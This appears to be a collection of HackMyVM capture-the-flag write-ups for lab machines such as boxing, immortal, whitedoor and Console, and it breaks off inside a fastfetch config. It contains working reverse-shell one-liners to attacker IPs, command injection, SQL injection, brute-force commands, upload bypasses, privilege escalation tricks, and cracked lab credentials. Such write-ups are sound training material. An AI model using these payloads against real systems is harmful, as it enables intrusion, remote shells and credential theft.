+```
+
+This will spawn a root shell and allow us to gain access as *root*.
+
+
+
+
+____________________________________________________________________________________________________
+Host NAME: boxing.hmv
+
+on fuzzing we find a feedback.php
+
+Directory indexing was also found on images, css, and js endpoints.
+
+In the feedback.php form, if we intercept the request, we can see an x-origin-domain header, which has the url staging-env.boxing.hmv
+
+
+Adding this to the hosts file reveals a new webpage.
+
+Here, we seem to be able to play around by navigating to server urls. Is it possible to play around with these urls to obtain something?
+
+So there is SSRF here like this:
+boxing.hmv@[ATTACKER IP]:8000
+
+Running a python http server will allow it to query it. Maybe we can make it query a php file and get code execution.
+
+Now that we have SSRF, it is time to see whether we can fuzz for local ports that are open. This will be done by making ffuf fuzz over this parameter
+boxing.hmv@localhost:FUZZ
+
+Fuzzing command:
+ffuf -u 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:FUZZ' -w <(seq 1 65000) -fs 1167
+
+So we get that port 5000 and port 80 are open. So let's try and find out what's in it.
+
+By entering this particular payload in the url:
+boxing.hmv@localhost:5000/index.php?processName=apache2
+
+
+So we can get command injection like this:
+curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=system%2B-e%2Bnc%2B-c%2Bbash%2B192.168.29.170%2B4444'
+
+Now /var/www/dev/boxing_database.db is an interesting file found by linpeas.sh
+
+We download this onto our machine and analyse it.
+
+On cracking credentials from the database, we get the password as Cassius!123 for the user cassius
+
+I have no idea wtf they did for privesc. I just copied the commands from this writeup:
+https://medium.com/@josemlwdf/boxing-fb1dca50fea7
+
+
+
+
+____________________________________________________________________________________________________
+# chromatica- A HackMyVM Machine
+
+MACHINE IP: 192.168.1.11
+
+Nmap scan:
+        - Port 22
+        - Port 80
+        - Port 5353
+
+On visiting /robots.txt in the website, we find a hidden page, /dev-portal/
+
+We find that directly visiting this page will return forbidden, but on a re analysis of /robots.txt we can see that the allowed user agent is dev.
+
+So let's try accessing this page using curl and setting the user agent to dev
+```bash
+curl http://192.168.1.11/dev-portal/ -A dev
+```
+
+This returns some html and a status code of 200. Therefore, we will edit our user agent in firefox to access the webpage.
+
+Now this page contains a search query and the search url is vulnerable to sql injection (obtained via testing on sqlmap).
+```bash
+sqlmap -u http://192.168.1.11/dev-portal/search.php?city=random --user-agent=dev
+```
+This reveals that it is vulnerable to sql injection.
+
+Now to get the database tables and passwords use this [link](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
+
+We get the usernames and passwords as follows:
+```
+Database: Chromatica                                                                                                                                        
+Table: users
+[5 entries]
++----+-----------------------------------------------+-----------+-----------------------------+
+| id | password                                      | username  | description                 |
++----+-----------------------------------------------+-----------+-----------------------------+
+| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
+| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
+| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
+| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
+| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
++----+-----------------------------------------------+-----------+-----------------------------+
+```
+
+Now I set the options to crack the hashes as well which is why the password to the `user` username is shown.
+
+So we have gained a pair of credentials as `user:keeptrying`.
+The other accounts may come in handy so we will keep an eye on them.
+
+So I was unable to gain access using the obtained credentials. So let's try using [crackstation](https://crackstation.net/) to crack the passwords.
+
+The credentials we have are as follows:
+```
+user:keeptrying
+intern:inttern00
+dev:flaghere
+admin:adm!n
+```
+
+Now it's time to see which one works.
+
+Trying *dev:flaghere*
+```bash
+dev@192.168.1.11's password: 
+GREETINGS,
+THIS ACCOUNT IS NOT A LOGIN ACCOUNT
+IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
+EITHER CONTACT YOUR ADMIN
+OR THINK OUTSIDE THE BOX
+BE LAZY AND CONTACT YOUR ADMIN
+OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
+REGARDS
+
+brightctf{ALM0ST_TH3R3_34897ffdf69}
+Connection to 192.168.1.11 closed.
+```
+
+So there probably is a way to get in using these credentials.
+
+We also dont have a password on **dev-selim** so I am under the assumption that might be the login. But the question arises, for exactly what are these usernames intended? Maybe its on the webpage??
+
+Ok so with a little bit of fuzzing I found that there is a `dev-portal/login.php`.
+Let's test these credentials on them.
+
+I assumed that this login page leads nowhere since any and every combination of data gave an Error Code 500, but maybe some sort of code injection might be possible.
+
+I was right in the hunch that the login page leads nowhere.
+
+Actually when you ssh using ***dev:flaghere*** credentials, and keep the window size of your terminal to a minimum, you will find a **more** option.
+
+Just type the command
+!/bin/bash
+
+And you now have access to the user flag.
+
+Now by running linpeas.sh we find a cron job called end_of_day.sh. This file is modifiable so I modify this file in order to give me access to the device as *analyst*. This is done by simply adding a *reverse shell* script to the file.
+
+This gave us access to analyst.
+
+Running linpeas.sh on analyst, I found that it can run **/usr/bin/nmap** as **sudo**. 
+
+Referring to **[gtfobins](https://gtfobins.github.io/gtfobins/nmap/)** I found the exploit that led to privilege escalation and got the root flag.
+                                                                                                     
+
+
+
+
+____________________________________________________________________________________________________
+# friendly3- A HackMyVM Machine 
+
+MACHINE IP: [MACHINE IP]
+
+NMAP SCAN:
+        - Port 22
+        - Port 80
+        - Port 21
+
+The website contains this message:
+--- BEGIN ---
+```
+Hi, sysadmin
+I want you to know that I've just uploaded the new files into the FTP Server.
+See you,
+juan.
+```
+--- END ---
+
+So we already have 2 usernames here, one is **sysadmin** and one is **juan**.
+
+Buy doing some good old fashioned brute force on the ftp server using this command
+```bash
+hydra 192.168.0.107 ftp -L usernames.txt -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -V -F
+```
+We get this valid combination 
+`juan:alexis`
+
+Just out of a hunch I tried this pair in ssh, and it worked.
+So we have gained initial access.
+
+User flag:cb40b159c8086733d57280de3f97de30
+
+Root flag: eb9748b67f25e6bd202e5fa25f534d51
+
+So by using a tool called pspy64, which allows us to monitor any processes running on a machine without root access, we find that a program called check_for_install.sh keeps running periodically. Reading this file, it turns out that it executes a bash file **/tmp/a.bash**
+
+So we create a bash file **/tmp/a.bash** containing our reverse shell payload.
+
+Spawning a nc listener on our machine, we can gain a root shell.
+
+Run pspy again and when the process runs we gain a reverse shell.
+
+
+
+
+____________________________________________________________________________________________________
+# HackingToys - A HackMyVM machine
+
+1. Enumeration: Standard 22 and 80 ports open
+2. Initial Access: The message parameter in the search page is vulnerable to SSTI. Just use SSTImap to gain a reverse shell. Setup persistence using ssh
+3. Pivot: The FastCGI service is running on port 9000. Use it to gain a shell to the dodi user.
+4. Privilege enum: Running `sudo -l` gives us /usr/local/bin/rvm_rails.sh. This allows us to run this script. On reading this script we can see that it runs the rails binary, which is owned by the lidia user, aka rvm.
+5. So we will replace this binary with a ruby revshell script. mv [our revshell] [target] && chmod 777 target. (Run this on the lidia user).
+6. Run this as sudo from the dodi user and boom we got a shell.
+
+
+Thats it. Fuck this im out
+
+
+
+
+____________________________________________________________________________________________________
+# immortal - A HackMyVM Machine
+
+MACHINE IP: 192.168.1.14
+
+HOST NAME: immortal.hmv
+
+Potential usernames: David, Drake, found on ftp.
+
+So the password of the login page on port 80 is **PASSWORD**, found by bruteforcing.
+
+Risky Functionality of file upload found on: ***http://immortal.hmv/upload_an_incredible_message.php***
+
+Now, it seems that a lot of files are blacklisted on the website. But using a tool [fuxploider](https://github.com/almandin/fuxploider) I managed to find that writing php code in this particular file format
+***file_upload.gif%00.phtml*** allowed us to gain RCE.
+
+The user flag is located at */home/drake* -> **FLAGHERE**
+
+/etc/crontab contains a cron job which is flagged as a PE vector by linpeas.sh. Let's check it out.
+
+On re-analysing the linpeas.sh scan, I found a suspicious file hidden in /home/drake/.../pass.txt
+The file contents:
+```
+netflix : drake123
+amazon : 123drake
+shelldred : shell123dred (f4ns0nly)
+system : kevcjnsgii
+bank : myfavouritebank
+nintendo : 123456
+```
+
+So, I assume we can use these credentials to bruteforce the password to drake. The password is **PASSWORD**.
+
+On running sudo -l
+```bash
+Matching Defaults entries for drake on Immortal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User drake may run the following commands on Immortal:
+    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py
+```
+
+So I modified /opt/immortal.py to spawn a shell. Since this can be run as root, we can get a root shell, which didnt end up working.
+
+Because, the shell that I have is very buggy, I logged in as drake using ssh.
+
+Now in the output of sudo -l we can see that we can run a command as the user eric.
+
+So let's use this particular command to do so:
+```bash
+sudo -u eric /usr/bin/python3 /opt/immortal.py
+```
+
+I modified the python script to include a shell payload as follows before running the above command:
+```python
+import pty
+a = input(str("Do you want to be immortal: "))
+
+if a.lower() == "yes" or a.lower() == "no":
+   print("Bad answer")
+else:
+   print("Are you sure?")
+   print("[+] Spawning shell")
+   pty.spawn("/bin/bash")
+```
+
+If you run this command after making the above modification we can get a shell on the eric user.
+
+We dont need to upgrade this shell as we're using pty.
+
+Running sudo -l on this user we get this output:
+```bash
+Matching Defaults entries for eric on Immortal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User eric may run the following commands on Immortal:
+    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
+    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
+```
+
+I can see the sudoedit command which can be executed as root. So maybe we can modify that file in order to gain a root shell on the machine.
+Change the contents of /etc/systemd/system/immortal.service
+
+```bash
+[Unit]
+Description=Immortal Service
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'exec nc 192.168.1.10 5555 -e /bin/sh'
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Start a listener on the attacker machine, on port 5555 and start the service after this. We will obtain a root shell. Get the root flag.
+
+
+
+
+
+____________________________________________________________________________________________________
+# liceo.hvm
+Hackmyvm liceo reference
+
+MACHINE IP: [Machine IP]
+
+Interesting stuff:
+port 22: ssh (standard shit)
+port 80: http (standard shit)
+port 21: ftp (vsftpd 3.0.5, allows anonymous login)
+
+Nothing interesting on the website so far. Let's try the anonymous login with ftp on port 21
+
+Found a note on the anonymous ftp login, which might be useful later.
+
+In the note, a name is mentioned called Matias. Could this be a username of some sort?
+It also mentions that it left some incomplete work on the web. What does this mean? Could this be the attack surface?
+
+It turns out there is an upload.php file which for some unknown reason isn't there in any wordlist that I possess 💀.
+
+Anyways, it has some kind of a blacklist which doesnt allow php file upload for .php.
+
+So, I changed the file extension to .phar, and uploaded it. On visiting the /uploads page, (found by fuzzing) and clicking on the .phar file, I got a reverse shell.
+
+Now, I uploaded linpeas.sh to the /tmp/privesc directory and running it shows me that I can run bash as sudo. However, I don't know the password. So let's try and find it.
+
+That didnt work 😭.
+
+ So we try running /usr/bin/bash in privileged mode:
+command: /usr/bin/bash -p
+
+This makes us root.
+
+
+
+
+____________________________________________________________________________________________________
+# principle2 - A HackMyVM Machine
+
+MACHINE IP: 192.168.1.35
+host name: principle2.hmv
+
+Masscan results:
+```
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-06-07 12:13:37 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 41789/tcp on 192.168.1.35                                 
+Discovered open port 43853/tcp on 192.168.1.35                                 
+Discovered open port 58861/tcp on 192.168.1.35                                 
+Discovered open port 111/tcp on 192.168.1.35                                   
+Discovered open port 43569/tcp on 192.168.1.35                                 
+Discovered open port 2049/tcp on 192.168.1.35                                  
+Discovered open port 139/tcp on 192.168.1.35                                   
+Discovered open port 80/tcp on 192.168.1.35                                    
+Discovered open port 35625/tcp on 192.168.1.35
+```
+
+An nmap scan reveals that the server is running some RPC and samba smb.
+
+Using the command
+showmount -e principle2.hmv 
+
+gives this output
+```
+Export list for principle2.hmv:
+/var/backups *
+/home/byron  *
+```
+
+Now I am not particulary knowledgable on microsoft rpc and what I did above was by watching youtube (not seeing a walkthrough of this machine).
+
+Now, with some magic (that I ripped off this youtube video right [here](https://www.youtube.com/watch?v=i0_t3zl_X_E)) I mounted a filesystem to the nfs. This revealed 2 files, memory.txt and mayor.txt
+
+Apparently there are passwords stored in hexadecimal available somewhere so I am gonna try and do it again and mount a tmp dir to another available directory, which is /var/backups
+
+I tried even more enumeration with enum4linux and I managed to find some publicly accessible shares. I accessed it as follows:
+smbclient \\ip\share 
+
+So after mounting /var/backups we can see that there is no permission to read any of the files. So instead, I created a new user as follows:
+```bash
+sudo useradd -u 54 hmv
+```
+which created a user hmv with uid 54
+
+Now when I try to read the files with the command
+```bash
+sudo -u hmv cat backups/*.txt
+```
+I can read the files. Now we know that they are in hexadecimal, so let's try and log in.
+
+The password to the hermanubis share is **ByronIsAsshole**
+
+The file reveals a website **thetruthoftalos.hmv**
+
+Add it to /etc/hosts and go to index.php
+
+This contains an LFI vulnerability found using [LFITester](https://github.com/kostas-pa/LFITester).
+
+Now by using the --autopwn option on the tool i managed to get a shell. I upgraded this shell and we now had initial access.
+
+Now we can login as www-data. Change this to hermanubis and use the given password. Once that is done, we can try to login as melville. 
+In hermanubis a file called investigation.txt reveals that the password is in the database for city we obtained. 
+So use hydra and bruteforce the ssh to melville. Alternatively you can use a tool called [suBF.sh](https://github.com/carlospolop/su-bruteforce/blob/master/suBF.sh) and then get the credentials.
+
+***melville:1bd5528b6def9812acba8eb21562c3ec***
+
+Now once you log in, you will see that the process /usr/local/share/report can be exploited for privesc (found in linpeas.sh).
+
+So in the home dir, create a file report with the following content:
+```bash
+#! /bin/bash
+
+chmod u+s /bin/bash
+```
+
+Now copy this file to the location of the original using
+```bash
+cp report /usr/local/share/report
+```
+
+Now run the command 
+```bash
+bash -p
+```
+
+We are root
+
+
+
+
+____________________________________________________________________________________________________
+# Publisher: A HackMyVM Machine
+
+Machine IP: 192.168.29.102
+HOST NAME: publisher.hmv
+
+Open ports: port 22, port 80
+
+Potential usernames: admin
+
+Interesting Link: http://192.168.29.101/spip/spip.php?article1
+Reflected values found, might be a sign of XSS.
+
+There is stored HTML injection in the webpage. If the title of the comment is enclosed in the h1 tags, it will be stored and shown in the comments section.
+
+Interesting Links:
+        - http://192.168.29.101/spip/spip.php?page=backend
+        - http://192.168.29.101/spip/spip.php?page=login&url=spip.php%3Fpage%3Drecherche%26amp%3Brecherche%3Dtitie&lang=en
+
+Pages found by fuzzing page=FUZZ:
+plan
+sommaire
+recherche
+ical
+login
+
+
+Looking up CVE-2023-27372
+
+we find an at https://github.com/0SPwn/CVE-2023-27372-PoC/blob/main/exploit.py
+
+Now we get a shell, which doesnt allow network based commands. So we encode the shell in base64 and then run it as follows
+echo "base64 encoded reverse shell" | base64 -d | bash
+
+Which will allow us to move the reverse shell out of the exploit shell into an actual shell.
+
+Now we can find an SSH private key for the user think. Create a file publisher_rsa on the attacker machine and use the command 
+chmod 600 [private key file]
+
+Now connect to the machine using the following command:
+ssh -i [private key file] think@publisher.hmv
+
+
+And we connect
+
+
+On running linpeas.sh we find a file /opt/run_container.sh  
+
+This file is not modifiable, so we harlink this file to a file in /tmp as follows
+ln /opt/run_container.sh /tmp/run_container.sh
+
+This file runs as root on startup, so we can add some reverse shell code to the file.
+
+We start a netcat listener on our machine and restart the target machine. This gives us the root shell.
+
+
+
+
+____________________________________________________________________________________________________
+# RoosterRun - A HackMyVM Machine
+## Enumeration
+MACHINE IP: [MACHINE IP]
+<br/>
+Port 80:<br/>
+	- Uses CMS Made Simple version 2.2.9.1<br/>
+	- It's also running apache httpd.<br/>
+	- msfconsole has exploits for this version of CMSMS but none of them work.
+<br/>
+
+ON RUNNING THE EXPLOITDB tool `https://www.exploit-db.com/exploits/46635` after debugging:<br/>
+---BEGIN OUTPUT---
+```
+[+] Salt for password found: 1a0112229fbd699d
+[+] Username found: admin
+[+] Email found: admin@localhost.com
+[+] Password found: 4f943036486b9ad48890b2efbf7735a8
+```
+---END OUTPUT---
+
+But, directly inputting this password doesn't appear to work, so I am assuming that the password is encrypted (it is actually encrypted with a salt and md5). 
+
+But when using this exploit `https://srcincite.io/pocs/cve-2021-26120.py.txt`, we get this output
+Command: 
+```bash
+python ssti_exploit.py [MACHINE IP] / "whoami"
+```
+---BEGIN OUTPUT---
+```
+(+) targeting http://192.168.1.102/
+(+) sql injection working!
+(+) leaking the username...
+(+) username: admin
+(+) resetting the admin's password stage 1
+(+) leaking the pwreset token...
+(+) pwreset: c1e98093f7bc11fa29534207132e97e3
+(+) done, resetting the admin's password stage 2
+(+) logging in...
+(+) leaking simplex template...
+(+) injecting payload and executing cmd...
+
+www-data
+```
+---END OUTPUT---
+
+You can see that it has output ***www-data*** as the current user. However, this command execution is only arbitrary.
+
+This cannot achieve a reverse shell however. So instead, I went through the code and found out, that this exploit *reset the admin username and password* to ***admin:admin***.
+
+## Initial Access
+This way, we can login to the admin page, and try to get RCE from there.
+
+Now, in the admin page, there is a file manager, which allows for file uploads. However, it blocks all php file uploads, so instead I changed my .php file to a .phar file. This allows the upload, and enables rce as www-data.
+
+On looking at config.php in the var/www/html folder, we see this snippet:<br/>
+---BEGIN OUTPUT---
+```php
+$config['dbms'] = 'mysqli';
+$config['db_hostname'] = 'localhost';
+$config['db_username'] = 'admin';
+$config['db_password'] = 'j42W9kDq9dN9hK';
+$config['db_name'] = 'cmsms_db';
+$config['db_prefix'] = 'cms_';
+$config['timezone'] = 'Europe/Berlin'
+```
+---END OUTPUT---
+
+We'll use this to connect to the mysql database with the command:
+```bash
+mysql -u admin -h localhost -p
+```
+And then enter the password.
+
+Here, we can use standard mysql commands in a MariaDB server to sift through the database, but this doesn't yield any results.
+
+On enumrating further, we find that a user ***matthieu*** exists, which contains the user flag.
+
+However, I have not managed to gain access as matthieu yet.
+
+
+
+
+____________________________________________________________________________________________________
+# SaveSanta - A hackmyvm machine
+
+## Enumeration
+- ***MACHINE_IP***: `[TARGET IP]`
+
+- The machine contains a /santa page which allows for a login (found in /robots.txt on a nikto and nmap default scripts (-sC) scan).
+
+- The request made by the page for logging in looks like this *http://[TARGET IP]/santa/?username=admin&password=admin*
+
+- However, trying to open this url a second time doesn't appear to work. It instead returns an *Error Code 404*.
+
+- On trying to navigate to other pages, we found that it still returned an error code 404, so we resorted to another nmap scan.
+
+## Initial Access
+
+- On running an nmap scan for the second time, after trying to login to the page, I found a port running an unknown service.
+
+- Using the command
+```bash
+nc [TARGET IP] [TARGET PORT]
+```
+
+- I login to the machine and gain the user flag.
+
+- I upgraded the shell and moved on to privesc.
+
+## Privilege Escalation
+
+***NOTE: THIS IS LIKELY NOT THE INTENDED METHOD OF PRIVILEGE ESCALATION***
+
+- So, all I did was download this exploit, which is the latest *[linux nftables privesc exploit](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit)* and ran it on the target machine.
+
+***NOTE: ON FURTHER TESTING OF THIS METHOD, WITHOUT GIVING THE VM MORE RAM, IT REGULARLY CRASHED THE MACHINE, IT ALSO CRASHED AFTER GIVING IT MORE RAM SO I CAN SAFELY SAY THAT THIS IS NOT THE INTENDED METHOD OF PRIVESC AS IT IS A ONE OFF FOR ME***
+
+Voila! We got root.
+
+
+
+
+
+____________________________________________________________________________________________________
+# vivifytech.hvm
+
+Machine IP: found by netdiscover
+
+/wordpress directory in port 80
+
+Used writeup for this bit:
+Reading the story of the company, we can find a bunch of users mentioned. Make that into a wordlist.
+
+Another one us in /wordpress/wp-includes/secrets.txt
+
+This has the passwords.
+
+Use this to bruteforce ssh to get
+
+sarah:bohicon
+
+-- My own from now --
+On using linpeas,
+we find that db name is wordpress and password is password. Use this to log in to mysql
+
+After that, go to the wp_users table to obtain this bit:
+username:password = sancelisso:$P$BPhGmUp9fmz6VHYL1FOPr33qtX.yyf1
+
+This can be cracked to login to the admin page
+
+Another way to do this is to cd to the .private folder
+we find this
+gbodja:4Tch055ouy370N
+
+Let's log in using ssh
+
+Here you can run git as sudo, found by using sudo -l
+So we use GTFObins to bypass and get privesc.
+
+
+
+
+
+____________________________________________________________________________________________________
+# whitedoor.hvm
+
+MACHINE IP: 192.168.0.107
+
+Nmap scan:
+        - Open ports: 80, 21, 22
+        - Nmap detects that anonymous ftp login allowed
+        - Contains a README.txt file. Let's check it out.
+
+Website:
+The port executes only the ls command. But if we input something like `ls; whoami` we get the output for both commands.
+
+Let's use this to obtain a reverse shell.
+
+I'm going to use this particular payload:
+```bash
+/bin/bash -c 'bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1
+```
+
+This spawns us a reverse shell as www-data. Time to try and upgrade.
+
+In the /home/whiteshell/Desktop/.my_secret_password.txt, we can find a username and password (probably encrypted)
+`whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K`
+
+Just by some form of random experimentation, or actually, putting this password through this website: https://www.tunnelsup.com/hash-analyzer/ 
+we find that this password is encoded using base64 2 times. So decrpyting this twice we get
+`whiteshell:Th1sIsTh3P4sSwOrDblac5`
+
+Now running linpeas on this login, we find a file in the user Gonzalo called my secret hash (very inconspicuous :|).
+`$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6`
+
+Let's decrypt this with john.
+```bash
+john --format=bcrypt crack.txt
+```
+
+Here, crack.txt is the file where the password is stored. I found that it is a bcrypt hash by running it thru the hash analyzer of dcode.fr (an online tool).
+
+On decrypting we get the password as:
+`qwertyuiop`
+
+So the username:password pair will be:
+`Gonzalo:qwertyuiop`
+
+This will get us the user flag.
+
+Time to see what we can do to PE. Time to bring in our old friend, `linpeas.sh`
+
+Now, we cant download to our base user folder. But I had already downloaded it to */tmp/privesc* so I ran the file from there.
+
+It says that vim can be run as sudo. This means that any command run on vim will be run as root. Time to use this to get root.
+
+So, I found that running the command
+```bash
+sudo /usr/bin/vim
+```
+
+And entering the password of Gonzalo will run vim as root. This allowed us to run root commands. So I type the command in normal mode
+```vim
+:!/bin/sh
+```
+
+To get a root shell. 
+
+Voila! We have completely owned the system.
+
+**NOTE: For binary privesc, research GTFObins for linux. It provides useful PE vectors.**
+
+
+
+
+
+____________________________________________________________________________________________________
+# Console: HackMyVM
+Difficulty: Medium
+
+## Enumeration
+On running an nmap scan, we get port 22, 80 and 5000 open, though 5000 doesnt appear to be accessible.
+
+Nmap Scan Results:
+
+```
+# Nmap 7.95 scan initiated Wed Aug  6 19:19:15 2025 as: /usr/lib/nmap/nmap -sC -sV -A -p- -o nmap.txt 192.168.0.110
+Nmap scan report for 192.168.0.110
+Host is up (0.0025s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp   open     http     Apache httpd 2.4.62 ((Debian))
+|_http-title: Console \xC2\xB7 \xE9\xBB\x91\xE5\xAE\xA2\xE7\x9A\x84\xE7\xAA\x97\xE5\x8F\xA3
+|_http-server-header: Apache/2.4.62 (Debian)
+443/tcp  open     ssl/http Apache httpd 2.4.62
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.62 (Debian)
+| ssl-cert: Subject: commonName=hacker.maze-sec.hmv/organizationName=Maze-Sec/stateOrProvinceName=Beijing/countryName=CN
+| Not valid before: 2025-05-17T09:19:35
+|_Not valid after:  2035-05-15T09:19:35
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+5000/tcp filtered upnp
+MAC Address: 08:00:27:98:BA:A6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: Host: hacker.maze-sec.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   2.52 ms 192.168.0.110
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Aug  6 19:19:37 2025 -- 1 IP address (1 host up) scanned in 22.47 seconds
+```
+
+So from this scan, we can see the subdomain `hacker.maze-sec.hmv`, so I added both `maze-sec.hmv` and `hacker.maze-sec.hmv` to the hosts file.
+
+Both of these sites contain basically nothing at first glance. And I was stuck here for most of the time. So I decided to check the source code of the websites.
+
+In `hacker.maze-sec.hmv` there is a hacker.js JavaScript file that can be found in the source code. There is this snippet in the code:
+```javascript
+let path = ['su', 'per', 'co', 'ool'].join('') + '.php';
+let param = ['cm', 'd='].join('');
+```
+
+So through this we can send a reverse shell payload. Now for whatever reason, you can't send a payload to practically any port except port 443. So any reverse shell payload to port 443 works. I used this one:
+
+1. base64 encode `sh -i >& /dev/tcp/192.168.0.111/443 0>&1` (replace the IP with your IP)
+
+```bash
+curl https://hacker.maze-sec.hmv/supercoool.php?cmd=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4wLjExMS80NDMgMD4mMQo=+|base64+-d+|+bash
+```
+
+This will gain you a shell on your listener, from where you can read the flag in `/home/welcome`.
+
+Read the .viminfo file of the welcome user to gain the password to the user.
+
+Credentials: `welcome:welcome123`
+
+## Pivoting
+
+Running `sudo -l` on the user welcome gives us this:
+```
+Matching Defaults entries for welcome on Console:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on Console:
+    (qaq) PASSWD: /bin/cat /opt/flask-app/logs/flask.log
+```
+
+And on running the command `sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log` we get this output (or something similar lol):
+```
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.110:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 258-005-805
+127.0.0.1 - - [06/Aug/2025 11:16:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [06/Aug/2025 11:16:40] "GET /console HTTP/1.1" 200 -
+127.0.0.1 - - [06/Aug/2025 11:17:46] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [06/Aug/2025 11:17:46] "GET /favicon.ico HTTP/1.1" 404 -
+```
+
+Since the development server here is running in debug mode, we can use the python console to execute commands as user qaq!
+
+So first login to the welcome user via SSH and port forward 5000 like this:
+
+```bash
+ssh -L 5000:127.0.0.1:5000 welcome@maze-sec.hmv
+```
+
+Now re-run `sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log` to regenerate the debugger PIN. 
+
+In your browser, go to "http://127.0.0.1:5000/console", and enter the Debugger PIN that is shown in the output of the previous command. This allows us to access the console.
+
+To get a reverse shell you can just use our old payload (again idk why it connects only through port 443). So the command you send would look something like this:
+```python
+import os
+
+os.system("<old payload>")
+```
+
+Keep a netcat listener running and you should see the shell spawn for user qaq. Stabilize the shell however you see fit.
+
+## Privilege Escalation
+
+This was the fun part. On running `sudo -l` you can see this.
+
+```
+Matching Defaults entries for qaq on Console:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User qaq may run the following commands on Console:
+    (ALL) NOPASSWD: /usr/bin/fastfetch
+```
+
+So how can we exploit fastfetch to run shell commands? This took me quite a while to figure out, then I saw this [reddit post](https://www.reddit.com/r/GarudaLinux/comments/1dcq0dl/making_fastfetch_more_beautiful_linux/). In this post it was this snippet that really interested me:
+
+```json
+{
+    "type": "command",
+    "key": "  OS Age ",
+    "keyColor": "magenta",
+    "text": "birth_install=$(stat -c %W /); current=$(date +%s); time_progression=$((current - birth_install)); days_difference=$((time_progression / 86400)); echo $days_difference days"
+},
+```
+
+So I just replaced all of this in the `text` parameter with the actual command I want to execute. Is there a simpler way to do this? Yes. But, I couldnt get any other config to work on my end so I just used this one.
+
+Here are the steps to gain the root flag.
+
+1. Run `/usr/bin/fastfetch --gen-config`
+2. In the generated config file (usually this one `/home/qaq/fastfetch/config.jsonc`) paste in this configuration
+
+```json
+{
+    "$schema": "https://github.com/fastfetch-cli/fastfetch/raw/dev/doc/json_schema.json",
+    "logo": {
+        "type": "builtin",
+        "height": 15,
+        "width": 30,
+        "padding": {
+            "top": 5,
+            "left": 3
+        }
+    },
+    "modules": [
+        "break",
+        {
+            "type": "custom",
+            "format": "\u001b[90m┌──────────────────────Hardware──────────────────────┐"
+        },
+        {
+            "type": "host",
+            "key": " PC",
+            "keyColor": "green"
+        },
+        {
+            "type": "cpu",
+            "key": "│ ├",
+            "keyColor": "green"
+        },
+        {
+            "type": "gpu",
+            "key": "│ ├󰍛",
+            "keyColor": "green"
+        },
+        {
+            "type": "memory",
+            "key": "│ ├󰍛",
